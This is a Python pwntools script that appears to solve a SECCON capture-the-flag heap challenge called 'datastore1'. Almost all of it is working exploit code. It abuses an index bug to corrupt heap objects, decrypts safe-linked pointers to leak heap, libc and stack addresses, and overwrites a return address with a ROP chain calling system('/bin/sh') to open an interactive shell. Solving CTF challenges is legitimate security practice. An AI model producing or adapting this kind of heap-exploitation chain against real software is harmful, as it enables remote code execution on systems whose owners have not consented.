from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "datastore1.seccon.games"
    port = 4585
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    if type(x) == str:
        x = x.encode("ascii")
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')

def sendline(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s)
    r.sendline(s)

def send(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()


# libc safe linking decrypt
def decrypt(cipher):
    key = 0
    plain  = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain

def encrypt(val, addr):
    return val ^ (addr >> 12)


####################################

def menu(choice):
    recvuntil(b':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=b'> '):
    recvuntil(r)
    #s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

# send `s` after r
def sa(r, s, new_line=True):
    rs(s, new_line, r)


"""
MENU
1. Edit
2. List
0. Exit
>
"""
def select_edit():
    rs(str(1))
def select_list():
    rs(str(2))
def select_update():
    rs(str(1))
def select_delete():
    rs(str(2))

def idx(i):
    recvuntil(b"index: ")
    sendline(str(i))

def create_array(size):
    rs("a")
    recvuntil(b"input size:")
    sendline(str(size))

def create_value(data):
    rs("v")
    recvuntil(b"input value: ")
    sendline(str(data))

def update_string(data):
    recvuntil(b"new string")
    recvuntil(b": ")
    sendline(data)


select_edit()
create_array(16)

select_edit()
idx(0)
select_update()
create_array(1)

select_edit()
idx(2)
select_update()
create_array(1)

select_edit()
idx(2)
select_delete()

select_edit()
idx(3)
select_update()
create_value(b"Z"*32)


select_edit()
idx(1)
select_update()
create_array(1)

select_edit()
idx(4)
select_update()
create_array(1)

select_edit()
idx(5)
select_update()
create_array(1)

select_edit()
idx(5)
select_delete()
select_edit()
idx(4)
select_delete()



##### break str at 3  ######

select_edit()
idx(0)
select_update()
idx(1) # bug
select_delete()


select_edit()
idx(0)
select_update()
idx(1) # bug
select_update()
create_value(str(0x100))


"""
0x5569a0b5d410:	0x5a5a5a5a5a5a2762	0x5a5a5a5a5a5a5a5a
0x5569a0b5d420:	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a
0x5569a0b5d430:	0x0000000000275a5a	0x0000000000000041
0x5569a0b5d440:	0x00000005569a0b5d	0xafc659994d7c8dfa
0x5569a0b5d450:	0x0000000000000000	0x0000000000000000
0x5569a0b5d460:	0x0000000000000000	0x0000000000000000
0x5569a0b5d470:	0x0000000000000000	0x0000000000000021
0x5569a0b5d480:	0x0000000000000001	0x0000000000000000
0x5569a0b5d490:	0x0000000000000000	0x0000000000000021
0x5569a0b5d4a0:	0x0000556cf62fdf9d	0xafc659994d7c8dfa
"""

### break array at 1 ####
select_edit()
idx(3)
select_update()
update_string(b"Z" * 32 + b"W" * 0x40 + p64(0) + p64(0x21) + p64(2) + p64(0) * 2 + p32(0xfeed0003))

select_list()
recvuntil(b"<I> ")
heap_encrypted = int(recvline())
heap_base = decrypt(heap_encrypted) - 0x4c0
print(hex(heap_base))

    

################# making unsorted bin #############

select_edit()
dummy = 15
idx(dummy)
select_update()
create_array(16)

for i in range(8):
    select_edit()
    idx(dummy)
    select_update()
    idx(i)
    select_update()
    create_array(16)

select_edit()
dummy2 = 14
idx(dummy2)
select_update()
create_array(16)

select_edit()
idx(dummy)
select_delete() # unsorted bin

##################

fake_str = p64(8) + p64(heap_base + 0x558)
fake_str_addr = heap_base + 0x460
print(f"target addr: {hex(fake_str_addr)}")
select_edit()
idx(3)
select_update()
update_string(b"Z" * 32 + b"W" * 0x30 + fake_str + p64(0) + p64(0x21) + p64(1) + p64(0xfeed0002) + p64(fake_str_addr))

select_list()
recvuntil(b"<S> ")
libc_base = just_u64(recvline()) - 0x219ce0
print("libc_base: ", hex(libc_base))

environ = libc_base + 0x221200


fake_str = p64(8) + p64(environ)
fake_str_addr = heap_base + 0x460
select_edit()
idx(3)
select_update()
update_string(b"Z" * 32 + b"W" * 0x30 + fake_str + p64(0) + p64(0x21) + p64(1) + p64(0xfeed0002) + p64(fake_str_addr))
#
select_list()
recvuntil(b"<S> ")
stack_base = just_u64(recvline()) 
print("stack_base: ", hex(stack_base))
ret_addr = stack_base - 0x120


fake_str = p64(64) + p64(ret_addr)
fake_str_addr = heap_base + 0x460
select_edit()
idx(3)
select_update()
update_string(b"Z" * 32 + b"W" * 0x30 + fake_str + p64(0) + p64(0x21) + p64(1) + p64(0xfeed0002) + p64(fake_str_addr))

binsh = 0x1d8698 + libc_base
system = 0x50d60 + libc_base
pop_rdi = 0x2a3e5 + libc_base
ret = pop_rdi + 1

payload = [
    ret,
    pop_rdi,
    binsh,
    system
]

payload = b''.join(map(p64, payload))
select_edit()
idx(1)
select_update()
idx(0)
select_update()
update_string(payload)


sendline(b"0")

interactive()
